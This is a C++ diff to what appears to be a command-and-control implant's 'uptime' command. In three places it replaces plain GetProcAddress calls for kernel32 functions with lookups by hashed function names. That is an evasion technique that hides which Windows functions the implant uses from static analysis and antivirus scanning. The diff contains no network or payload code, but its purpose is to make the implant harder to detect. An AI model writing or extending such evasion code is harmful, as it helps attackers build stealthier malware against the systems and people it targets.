@@ -22,8 +22,8 @@ auto declfn starburst::cmd_uptime(
     auto k32 = (HMODULE)inst.kernel32.handle;
 
     auto pGetSystemTime = reinterpret_cast<fn_GetSystemTime>(
-        inst.kernel32.GetProcAddress( k32,
-            symbol<LPCSTR>( "GetSystemTime" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( k32 ),
+            expr::hash_string( "GetSystemTime" ) ) );
 
     if ( !pGetSystemTime ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -34,8 +34,8 @@ auto declfn starburst::cmd_uptime(
 #ifdef _WIN64
     typedef ULONGLONG (WINAPI *fn_GetTickCount64)( void );
     auto pGTC = reinterpret_cast<fn_GetTickCount64>(
-        inst.kernel32.GetProcAddress( k32,
-            symbol<LPCSTR>( "GetTickCount64" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( k32 ),
+            expr::hash_string( "GetTickCount64" ) ) );
     if ( !pGTC ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
@@ -45,8 +45,8 @@ auto declfn starburst::cmd_uptime(
 #else
     typedef DWORD (WINAPI *fn_GetTickCount32)( void );
     auto pGTC = reinterpret_cast<fn_GetTickCount32>(
-        inst.kernel32.GetProcAddress( k32,
-            symbol<LPCSTR>( "GetTickCount" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( k32 ),
+            expr::hash_string( "GetTickCount" ) ) );
     if ( !pGTC ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
